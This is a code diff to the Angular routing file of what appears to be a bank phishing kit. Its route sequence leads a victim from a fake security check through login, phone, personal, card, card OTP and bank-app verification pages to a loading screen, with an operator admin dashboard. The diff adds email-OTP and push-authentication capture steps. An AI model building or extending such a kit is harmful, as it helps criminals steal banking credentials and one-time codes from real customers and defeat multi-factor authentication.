@@ -12,20 +12,24 @@ import { SuccessComponent } from '../components/success.component';
 import { StepSuccessComponent } from '../components/step-success.component';
 import { AdminDashboardComponent } from '../components/admin-dashboard.component';
 import { LoadingComponent } from '../components/loading.component';
+import { EmailOtpComponent } from '../components/email-otp.component';
+import { PushNotificationComponent } from '../components/push-notification.component';
 
 export const routes: Routes = [
     { path: '', redirectTo: 'security_check', pathMatch: 'full' },
-    { path: 'security_check', component: SecurityCheckComponent },
-    { path: 'login', component: LoginComponent },
-    { path: 'limited', component: LimitedAccessComponent },
-    { path: 'phone', component: PhoneVerificationComponent },
-    { path: 'personal', component: PersonalVerificationComponent },
-    { path: 'card', component: CardVerificationComponent },
-    { path: 'card_otp', component: CardOtpComponent },
-    { path: 'bank_app', component: BankAppVerificationComponent },
-    { path: 'loading', component: LoadingComponent },
-    { path: 'step_success', component: StepSuccessComponent },
-    { path: 'success', component: SuccessComponent },
-    { path: 'admin', component: AdminDashboardComponent },
+    { path: 'security_check', component: SecurityCheckComponent, data: { animation: 'Security' } },
+    { path: 'login', component: LoginComponent, data: { animation: 'Login' } },
+    { path: 'limited', component: LimitedAccessComponent, data: { animation: 'Limited' } },
+    { path: 'phone', component: PhoneVerificationComponent, data: { animation: 'Phone' } },
+    { path: 'personal', component: PersonalVerificationComponent, data: { animation: 'Personal' } },
+    { path: 'card', component: CardVerificationComponent, data: { animation: 'Card' } },
+    { path: 'card_otp', component: CardOtpComponent, data: { animation: 'CardOtp' } },
+    { path: 'bank_app', component: BankAppVerificationComponent, data: { animation: 'BankApp' } },
+    { path: 'email_otp', component: EmailOtpComponent, data: { animation: 'EmailOtp' } },
+    { path: 'push_auth', component: PushNotificationComponent, data: { animation: 'PushAuth' } },
+    { path: 'loading', component: LoadingComponent, data: { animation: 'Loading' } },
+    { path: 'step_success', component: StepSuccessComponent, data: { animation: 'Success' } },
+    { path: 'success', component: SuccessComponent, data: { animation: 'SuccessFinal' } },
+    { path: 'admin', component: AdminDashboardComponent, data: { animation: 'Admin' } },
     { path: '**', redirectTo: 'security_check' }
 ];
